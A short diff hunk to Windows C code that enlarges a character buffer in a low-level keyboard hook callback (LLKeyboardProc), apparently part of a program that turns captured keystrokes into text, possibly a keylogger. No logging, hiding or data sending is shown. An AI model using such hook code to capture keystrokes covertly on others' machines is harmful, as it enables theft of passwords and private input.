@@ -98,7 +98,7 @@ char* returnSpecialKey(DWORD charCode, char * c)
 LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
 {
     KBDLLHOOKSTRUCT k = *(KBDLLHOOKSTRUCT *)lp;
-    char c[8];
+    char c[32];
 
     if(nCode < 0)
         return CallNextHookEx(kbdhook, nCode, wp, lp);
